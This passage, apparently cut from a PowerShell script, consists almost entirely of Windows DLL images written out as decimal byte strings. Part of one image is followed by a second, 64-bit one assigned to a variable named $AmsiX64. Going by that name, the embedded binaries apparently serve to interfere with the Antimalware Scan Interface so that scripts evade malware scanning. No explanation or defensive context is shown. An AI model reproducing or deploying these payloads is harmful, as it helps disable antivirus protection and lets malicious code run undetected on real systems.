110 116 0 0 54 0 95 105 110 105 116 105 97 108 105 122 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 0 62 0 95 114 101 103 105 115 116 101 114 95 111 110 101 120 105 116 95 102 117 110 99 116 105 111 110 0 36 0 95 101 120 101 99 117 116 101 95 111 110 101 120 105 116 95 116 97 98 108 101 0 31 0 95 99 114 116 95 97 116 101 120 105 116 0 23 0 95 99 101 120 105 116 0 0 97 112 105 45 109 115 45 119 105 110 45 99 114 116 45 114 117 110 116 105 109 101 45 108 49 45 49 45 48 46 100 108 108 0 130 5 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 0 67 5 83 101 116 85 110 104 97 110 100 108 101 100 69 120 99 101 112 116 105 111 110 70 105 108 116 101 114 0 9 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 0 97 5 84 101 114 109 105 110 97 116 101 80 114 111 99 101 115 115 0 0 109 3 73 115 80 114 111 99 101 115 115 111 114 70 101 97 116 117 114 101 80 114 101 115 101 110 116 0 45 4 81 117 101 114 121 80 101 114 102 111 114 109 97 110 99 101 67 111 117 110 116 101 114 0 10 2 71 101 116 67 117 114 114 101 110 116 80 114 111 99 101 115 115 73 100 0 14 2 71 101 116 67 117 114 114 101 110 116 84 104 114 101 97 100 73 100 0 0 214 2 71 101 116 83 121 115 116 101 109 84 105 109 101 65 115 70 105 108 101 84 105 109 101 0 75 3 73 110 105 116 105 97 108 105 122 101 83 76 105 115 116 72 101 97 100 0 103 3 73 115 68 101 98 117 103 103 101 114 80 114 101 115 101 110 116 0 75 69 82 78 69 76 51 50 46 100 108 108 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 177 25 191 68 78 230 64 187 255 255 255 255 0 0 0 0 1 0 0 0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 54 0 0 0 73 0 0 0 76 0 0 0 12 0 0 0 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 24 0 0 0 24 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 2 0 0 0 48 0 0 128 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 9 4 0 0 72 0 0 0 96 80 0 0 125 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 60 63 120 109 108 32 118 101 114 115 105 111 110 61 39 49 46 48 39 32 101 110 99 111 100 105 110 103 61 39 85 84 70 45 56 39 32 115 116 97 110 100 97 108 111 110 101 61 39 121 101 115 39 63 62 13 10 60 97 115 115 101 109 98 108 121 32 120 109 108 110 115 61 39 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 49 39 32 109 97 110 105 102 101 115 116 86 101 114 115 105 111 110 61 39 49 46 48 39 62 13 10 32 32 60 116 114 117 115 116 73 110 102 111 32 120 109 108 110 115 61 34 117 114 110 58 115 99 104 101 109 97 115 45 109 105 99 114 111 115 111 102 116 45 99 111 109 58 97 115 109 46 118 51 34 62 13 10 32 32 32 32 60 115 101 99 117 114 105 116 121 62 13 10 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 32 32 32 32 60 114 101 113 117 101 115 116 101 100 69 120 101 99 117 116 105 111 110 76 101 118 101 108 32 108 101 118 101 108 61 39 97 115 73 110 118 111 107 101 114 39 32 117 105 65 99 99 101 115 115 61 39 102 97 108 115 101 39 32 47 62 13 10 32 32 32 32 32 32 60 47 114 101 113 117 101 115 116 101 100 80 114 105 118 105 108 101 103 101 115 62 13 10 32 32 32 32 60 47 115 101 99 117 114 105 116 121 62 13 10 32 32 60 47 116 114 117 115 116 73 110 102 111 62 13 10 60 47 97 115 115 101 109 98 108 121 62 13 10 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 16 0 0 12 1 0 0 7 48 108 48 155 48 171 48 194 48 211 48 228 48 233 48 2 49 7 49 20 49 97 49 126 49 136 49 150 49 168 49 189 49 251 49 212 50 7 51 85 51 94 51 105 51 112 51 144 51 150 51 156 51 162 51 168 51 174 51 181 51 188 51 195 51 202 51 209 51 216 51 223 51 231 51 239 51 247 51 3 52 12 52 17 52 23 52 33 52 43 52 59 52 75 52 91 52 100 52 201 52 121 53 170 53 249 53 12 54 31 54 43 54 59 54 76 54 114 54 135 54 142 54 148 54 166 54 176 54 17 55 30 55 69 55 77 55 102 55 160 55 187 55 199 55 214 55 223 55 236 55 27 56 35 56 46 56 52 56 58 56 70 56 76 56 111 56 160 56 75 57 106 57 116 57 133 57 146 57 151 57 189 57 194 57 231 57 241 57 14 58 91 58 96 58 115 58 129 58 156 58 167 58 54 59 63 59 71 59 142 59 157 59 164 59 218 59 227 59 240 59 251 59 4 60 19 60 30 60 36 60 42 60 48 60 54 60 60 60 66 60 72 60 78 60 84 60 90 60 96 60 102 60 108 60 114 60 0 0 0 32 0 0 32 0 0 0 112 48 164 48 168 48 92 49 96 49 104 49 48 52 80 52 108 52 112 52 140 52 144 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\u0026#34; $AmsiX64 = \u0026#34;77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 1 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 148 172 98 253 208 205 12 174 208 205 12 174 208 205 12 174 217 181 159 174 210 205 12 174 190 150 13 175 211 205 12 174 190 150 15 175 210 205 12 174 190 150 9 175 216 205 12 174 190 150 8 175 217 205 12 174 13 50 199 174 210 205 12 174 208 205 13 174 240 205 12 174 2 150 4 175 209 205 12 174 2 150 243 174 209 205 12 174 2 150 14 175 209 205 12 174 82 105 99 104 208 205 12 174 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 7 0 136 29 62 87 0 0 0 0 0 0 0 0 240 0 34 32 11 2 14 0 0 16 0 0 0 28 0 0 0 0 0 0 160 19 0 0 0 16 0 0 0 0 0 128 1 0 0 0 0 16 0 0 0 2 0 0 6 0 0 0 0 0 0 0 6 0 0 0 0 0 0 0 0 128 0 0 0 4 0 0 0 0 0 0 2 0 96 1 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 108 38 0 0 80 0 0 0 0 96 0 0 224 1 0 0 0 64 0 0 176 1 0 0 0 0 0 0 0 0 0 0 0 112 0 0 24 0 0 0 112 33 0 0 112 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 224 33 0 0 148 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 248 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 46 116 101 120 116 0 0 0 211 14 0 0 0 16 0 0 0 16 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 32 0 0 96 46 114 100 97 116 97 0 0 128 10 0 0 0 32 0 0 0 12 0 0 0 20 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 100 97 116 97 0 0 0 64 6 0 0 0 48 0 0 0 2 0 0 0 32 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 46 112 100 97 116 97 0 0 176 1 0 0 0 64 0 0 0 2 0 0 0 34 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 103 102 105 100 115 0 0 16 0 0 0 0 80 0 0 0 2 0 0 0 36 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 115 114 99 0 0 0 224 1 0 0 0 96 0 0 0 2 0 0 0 38 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 64 46 114 101 108 111 99 0 0 24 0 0 0 0 112 0 0 0 2 0 0 0 40 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 66 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 192 195 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 72 59 13 217 31 0 0 242 117 18 72 193 193 16 102 247 193 255 255 242 117 2 242 195 72 193 201 16 233 211 3 0 0 204 204 204 72 131 236 40 133 210 116 57 131 234 1 116 40 131 234 1 116 22 131 250 1 116 10 184 1 0 0 0 72 131 196 40 195 232 142 5 0 0 235 5 232 95 5 0 0 15 182 192 72 131 196 40 195 73 139 208 72 131 196 40 233 15 0 0 0 77 133 192 15 149 193 72 131 196 40 233 44 1 0 0 72 137 92 36 8 72 137 116 36 16 72 137 124 36 32 65 86 72 131 236 32 72 139 242 76 139 241 51 201 232 2 6 0 0 132 192 117 7 51 192 233 232 0 0 0 232 150 4 0 0 138 216 136 68 36 64 64 183 1 131 61 234 36 0 0 0 116 10 185 7 0 0 0 232 62 9 0 0 199 5 212 36 0 0 1 0 0 0 232 199 4 0 0 132 192 116 103 232 110 10 0 0 72 141 13 179 10 0 0 232 6 8 0 0 232 197 8 0 0 72 141 13 206 8 0 0 232 245 7 0 0 232 224 8 0 0 72 141 21 253 15 0 0 72 141 13 238 15 0 0 232 213 12 0 0 133 192 117 41 232 96 4 0 0 132 192 116 32 72 141 21 205 15 0 0 72 141 13 190 15 0 0 232 175 12 0 0 199 5 103 36 0 0 2 0 0 0 64 50 255 138 203 232 9 7 0 0 64 132 255 15 133 78 255 255 255 232 167 8 0 0 72 139 216 72 131 56 0 116 36 72 139 200 232 78 6 0 0 132 192 116 24 72 139 27 72 139 203 232 111 10 0 0 76 139 198 186 2 0 0 0 73 139 206 255 211 255 5 156 30 0 0 184 1 0 0 0 72 139 92 36 48 72 139 116 36 56 72 139 124 36 72 72 131 196 32 65 94 195 204 72 137 92 36 8 72 137 116 36 24 87 72 131 236 32 64 138 241 139 5 104 30 0 0 51 219 133 192 127 4 51 192 235 80 255 200 137 5 86 30 0 0 232 109 3 0 0 64 138 248 136 68 36 56 131 61 195 35 0 0 2 116 10 185 7 0 0 0 232 23 8 0 0 232 102 4 0 0 137 29 172 35 0 0 232 139 4 0 0 64 138 207 232 75 6 0 0 51 210 64 138 206 232 101 6 0 0 132 192 15 149 195 139 195 72 139 92 36 48 72 139 116 36 64 72 131 196 32 95 195 204 204 72 139 196 72 137 88 32 76 137 64 24 137 80 16 72 137 72 8 86 87 65 86 72 131 236 64 77 139 240 139 250 72 139 241 141 66 255 131 248 1 119 46 232 217 0 0 0 139 216 137 68 36 48 133 192 15 132 179 0 0 0 77 139 198 139 215 72 139 206 232 182 253 255 255 139 216 137 68 36 48 133 192 15 132 152 0 0 0 131 255 1 117 8 72 139 206 232 55 11 0 0 77 139 198 139 215 72 139 206 232 74 253 255 255 139 216 137 68 36 48 131 255 1 117 52 133 192 117 39 77 139 198 51 210 72 139 206 232 46 253 255 255 77 139 198 51 210 72 139 206 232 101 253 255 255 77 139 198 51 210 72 139 206 232 96 0 0 0 131 255 1 117 4 133 219 116 4 133 255 117 12 72 139 206 232 229 10 0 0 133 255 116 5 131 255 3 117 42 77 139 198 139 215 72 139 206 232 45 253 255 255 139 216 137 68 36 48 133 192 116 19 77 139 198 139 215 72 139 206 232 30 0 0 0 139 216 137 68 36 48 235 6 51 219 137 92 36 48 139 195 72 139 92 36 120 72 131 196 64 65 94 95 94 195 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 72 139 29 233 13 0 0 73 139 248 139 242 72 139 233 72 133 219 117 5 141 67 1 235 18 72 139 203 232 127 8 0 0 76 139 199 139 214 72 139 205 255 211 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 195 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 73 139 248 139 218 72 139 241 131 250 1 117 5 232 99 5 0 0 76 139 199 139 211 72 139 206 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 233 103 254 255 255 204 204 204 64 83 72 131 236 32 72 139 217 51 201 255 21 119 12 0 0 72 139 203 255 21 6 12 0 0 255 21 32 12 0 0 72 139 200 186 9 4 0 192 72 131 196 32 91 72 255 37 76 12 0 0 72 137 76 36 8 72 131 236 56 185 23 0 0 0 232 13 10 0 0 133 192 116 7 185 2 0 0 0 205 41 72 141 13 183 28 0 0 232 170 0 0 0 72 139 68 36 56 72 137 5 158 29 0 0 72 141 68 36 56 72 131 192 8 72 137 5 46 29 0 0 72 139 5 135 29 0 0 72 137 5 248 27 0 0 72 139 68 36 64 72 137 5 252 28 0 0 199 5 210 27 0 0 9 4 0 192 199 5 204 27 0 0 1 0 0 0 199 5 214 27 0 0 1 0 0 0 184 8 0 0 0 72 107 192 0 72 141 13 206 27 0 0 72 199 4 1 2 0 0 0 184 8 0 0 0 72 107 192 0 72 139 13 70 27 0 0 72 137 76 4 32 184 8 0 0 0 72 107 192 1 72 139 13 57 27 0 0 72 137 76 4 32 72 141 13 125 12 0 0 232 0 255 255 255 72 131 196 56 195 204 204 204 64 83 86 87 72 131 236 64 72 139 217 255 21 31 11 0 0 72 139 179 248 0 0 0 51 255 69 51 192 72 141 84 36 96 72 139 206 255 21 253 10 0 0 72 133 192 116 57 72 131 100 36 56 0 72 141 76 36 104 72 139 84 36 96 76 139 200 72 137 76 36 48 76 139 198 72 141 76 36 112 72 137 76 36 40 51 201 72 137 92 36 32 255 21 190 10 0 0 255 199 131 255 2 124 177 72 131 196 64 95 94 91 195 204 204 204 72 131 236 40 232 103 8 0 0 133 192 116 33 101 72 139 4 37 48 0 0 0 72 139 72 8 235 5 72 59 200 116 20 51 192 240 72 15 177 13 64 32 0 0 117 238 50 192 72 131 196 40 195 176 1 235 247 204 204 204 72 131 236 40 232 43 8 0 0 133 192 116 7 232 94 6 0 0 235 5 232 95 8 0 0 176 1 72 131 196 40 195 72 131 236 40 51 201 232 65 1 0 0 132 192 15 149 192 72 131 196 40 195 204 204 204 72 131 236 40 232 99 8 0 0 132 192 117 4 50 192 235 18 232 86 8 0 0 132 192 117 7 232 77 8 0 0 235 236 176 1 72 131 196 40 195 72 131 236 40 232 59 8 0 0 232 54 8 0 0 176 1 72 131 196 40 195 204 204 204 72 137 92 36 8 72 137 108 36 16 72 137 116 36 24 87 72 131 236 32 73 139 249 73 139 240 139 218 72 139 233 232 152 7 0 0 133 192 117 23 131 251 1 117 18 72 139 207 232 187 5 0 0 76 139 198 51 210 72 139 205 255 215 72 139 84 36 88 139 76 36 80 72 139 92 36 48 72 139 108 36 56 72 139 116 36 64 72 131 196 32 95 233 153 7 0 0 204 204 204 72 131 236 40 232 79 7 0 0 133 192 116 16 72 141 13 72 31 0 0 72 131 196 40 233 145 7 0 0 232 106 249 255 255 133 192 117 5 232 143 7 0 0 72 131 196 40 195 72 131 236 40 51 201 232 141 7 0 0 72 131 196 40 233 132 7 0 0 64 83 72 131 236 32 15 182 5 59 31 0 0 133 201 187 1 0 0 0 15 68 195 136 5 43 31 0 0 232 46 5 0 0 232 93 7 0 0 132 192 117 4 50 192 235 20 232 80 7 0 0 132 192 117 9 51 201 232 69 7 0 0 235 234 138 195 72 131 196 32 91 195 204 204 204 72 137 92 36 8 85 72 139 236 72 131 236 64 139 217 131 249 1 15 135 166 0 0 0 232 171 6 0 0 133 192 116 43 133 219 117 39 72 141 13 160 30 0 0 232 225 6 0 0 133 192 116 4 50 192 235 122 72 141 13 164 30 0 0 232 205 6 0 0 133 192 15 148 192 235 103 72 139 21 169 24 0 0 73 131 200 255 139 194 185 64 0 0 0 131 224 63 43 200 176 1 73 211 200 76 51 194 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 16 77 240 15 17 5 69 30 0 0 76 137 69 224 76 137 69 232 15 16 69 224 76 137 69 240 242 15 17 13 61 30 0 0 242 15 16 77 240 15 17 5 57 30 0 0 242 15 17 13 65 30 0 0 72 139 92 36 80 72 131 196 64 93 195 185 5 0 0 0 232 84 2 0 0 204 204 204 204 72 131 236 24 76 139 193 184 77 90 0 0 102 57 5 29 232 255 255 117 124 72 99 5 80 232 255 255 72 141 21 13 232 255 255 72 141 12 16 129 57 80 69 0 0 117 98 184 11 2 0 0 102 57 65 24 117 87 76 43 194 15 183 65 20 72 141 81 24 72 3 208 15 183 65 6 72 141 12 128 76 141 12 202 72 137 20 36 73 59 209 116 24 139 74 12 76 59 193 114 10 139 66 8 3 193 76 59 192 114 8 72 131 194 40 235 223 51 210 72 133 210 117 4 50 192 235 23 247 66 36 0 0 0 128 116 4 50 192 235 10 176 1 235 6 50 192 235 2 50 192 72 131 196 24 195 64 83 72 131 236 32 138 217 232 83 5 0 0 51 210 133 192 116 11 132 219 117 7 72 135 21 62 29 0 0 72 131 196 32 91 195 64 83 72 131 236 32 128 61 99 29 0 0 0 138 217 116 4 132 210 117 14 138 203 232 144 5 0 0 138 203 232 137 5 0 0 176 1 72 131 196 32 91 195 204 64 83 72 131 236 32 72 139 21 55 23 0 0 72 139 217 139 202 72 51 21 251 28 0 0 131 225 63 72 211 202 72 131 250 255 117 10 72 139 203 232 63 5 0 0 235 15 72 139 211 72 141 13 219 28 0 0 232 34 5 0 0 51 201 133 192 72 15 68 203 72 139 193 72 131 196 32 91 195 204 72 131 236 40 232 167 255 255 255 72 247 216 27 192 247 216 255 200 72 131 196 40 195 204 72 137 92 36 32 85 72 139 236 72 131 236 32 72 131 101 24 0 72 187 50 162 223 45 153 43 0 0 72 139 5 185 22 0 0 72 59 195 117 111 72 141 77 24 255 21 226 6 0 0 72 139 69 24 72 137 69 16 255 21 220 6 0 0 139 192 72 49 69 16 255 21 216 6 0 0 139 192 72 141 77 32 72 49 69 16 255 21 208 6 0 0 139 69 32 72 141 77 16 72 193 224 32 72 51 69 32 72 51 69 16 72 51 193 72 185 255 255 255 255 255 255 0 0 72 35 193 72 185 51 162 223 45 153 43 0 0 72 59 195 72 15 68 193 72 137 5 69 22 0 0 72 139 92 36 72 72 247 208 72 137 5 62 22 0 0 72 131 196 32 93 195 72 141 13 57 28 0 0 72 255 37 82 6 0 0 204 204 72 141 13 41 28 0 0 233 6 4 0 0 72 141 5 45 28 0 0 195 72 141 5 45 28 0 0 195 72 131 236 40 232 231 255 255 255 72 131 8 4 232 230 255 255 255 72 131 8 2 72 131 196 40 195 204 72 141 5 25 28 0 0 195 72 137 92 36 8 85 72 141 172 36 64 251 255 255 72 129 236 192 5 0 0 139 217 185 23 0 0 0 232 243 3 0 0 133 192 116 4 139 203 205 41 131 37 224 27 0 0 0 72 141 77 240 51 210 65 184 208 4 0 0 232 151 3 0 0 72 141 77 240 255 21 173 5 0 0 72 139 157 232 0 0 0 72 141 149 216 4 0 0 72 139 203 69 51 192 255 21 139 5 0 0 72 133 192 116 60 72 131 100 36 56 0 72 141 141 224 4 0 0 72 139 149 216 4 0 0 76 139 200 72 137 76 36 48 76 139 195 72 141 141 232 4 0 0 72 137 76 36 40 72 141 77 240 72 137 76 36 32 51 201 255 21 66 5 0 0 72 139 133 200 4 0 0 72 141 76 36 80 72 137 133 232 0 0 0 51 210 72 141 133 200 4 0 0 65 184 152 0 0 0 72 131 192 8 72 137 133 136 0 0 0 232 0 3 0 0 72 139 133 200 4 0 0 72 137 68 36 96 199 68 36 80 21 0 0 64 199 68 36 84 1 0 0 0 255 21 14 5 0 0 131 248 1 72 141 68 36 80 72 137 68 36 64 72 141 69 240 15 148 195 72 137 68 36 72 51 201 255 21 45 5 0 0 72 141 76 36 64 255 21 186 4 0 0 133 192 117 10 246 219 27 192 33 5 220 26 0 0 72 139 156 36 208 5 0 0 72 129 196 192 5 0 0 93 195 204 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 154 9 0 0 72 141 53 147 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 105 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 137 92 36 8 72 137 116 36 16 87 72 131 236 32 72 141 29 94 9 0 0 72 141 53 87 9 0 0 235 22 72 139 59 72 133 255 116 10 72 139 207 232 29 0 0 0 255 215 72 131 195 8 72 59 222 114 229 72 139 92 36 48 72 139 116 36 56 72 131 196 32 95 195 204 204 72 255 37 241 4 0 0 204 72 137 92 36 16 85 72 139 236 72 131 236 32 131 101 232 0 51 201 51 192 199 5 245 19 0 0 2 0 0 0 15 162 68 139 193 199 5 226 19 0 0 1 0 0 0 65 129 240 110 116 101 108 68 139 202 65 129 241 105 110 101 73 68 139 210 69 11 200 139 211 129 242 71 101 110 117 68 139 216 68 11 202 184 1 0 0 0 65 15 148 192 129 241 99 65 77 68 129 243 65 117 116 104 65 129 242 101 110 116 105 65 11 218 11 217 65 15 148 194 51 201 15 162 68 139 201 137 69 240 69 132 192 68 137 77 248 68 139 5 156 25 0 0 139 200 137 93 244 137 85 252 116 82 72 131 13 118 19 0 0 255 65 131 200 4 37 240 63 255 15 68 137 5 122 25 0 0 61 192 6 1 0 116 40 61 96 6 2 0 116 33 61 112 6 2 0 116 26 5 176 249 252 255 131 248 32 119 27 72 187 1 0 1 0 1 0 0 0 72 15 163 195 115 11 65 131 200 1 68 137 5 64 25 0 0 69 132 210 116 25 129 225 0 15 240 15 129 249 0 15 96 0 124 11 65 131 200 4 68 137 5 34 25 0 0 184 7 0 0 0 137 85 224 68 137 77 228 68 59 216 124 36 51 201 15 162 137 69 240 137 93 244 137 77 248 137 85 252 137 93 232 15 186 227 9 115 11 65 131 200 2 68 137 5 237 24 0 0 65 15 186 225 20 115 110 199 5 192 18 0 0 2 0 0 0 199 5 186 18 0 0 6 0 0 0 65 15 186 225 27 115 83 65 15 186 225 28 115 76 51 201 15 1 208 72 193 226 32 72 11 208 72 137 85 16 72 139 69 16 36 6 60 6 117 50 139 5 140 18 0 0 131 200 8 199 5 123 18 0 0 3 0 0 0 246 69 232 32 137 5 117 18 0 0 116 19 131 200 32 199 5 98 18 0 0 5 0 0 0 137 5 96 18 0 0 51 192 72 139 92 36 56 72 131 196 32 93 195 204 204 204 51 192 57 5 92 18 0 0 15 149 192 195 194 0 0 204 204 204 204 204 255 37 178 2 0 0 255 37 164 2 0 0 255 37 150 2 0 0 255 37 136 2 0 0 255 37 122 2 0 0 255 37 228 2 0 0 255 37 214 2 0 0 255 37 200 2 0 0 255 37 186 2 0 0 255 37 172 2 0 0 255 37 158 2 0 0 255 37 144 2 0 0 255 37 130 2 0 0 255 37 116 2 0 0 255 37 30 2 0 0 204 204 176 1 195 204 204 204 204 204 204 204 102 102 15 31 132 0 0 0 0 0 255 224 64 85 72 131 236 32 72 139 234 138 77 64 72 131 196 32 93 233 4 250 255 255 204 64 85 72 131 236 32 72 139 234 232 45 248 255 255 138 77 56 72 131 196 32 93 233 232 249 255 255 204 64 85 72 131 236 48 72 139 234 72 139 1 139 16 72 137 76 36 40 137 84 36 32 76 141 13 161 241 255 255 76 139 69 112 139 85 104 72 139 77 96 232 93 247 255 255 144 72 131 196 48 93 195 204 64 85 72 139 234 72 139 1 51 201 129 56 5 0 0 192 15 148 193 139 193 93 195 204 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 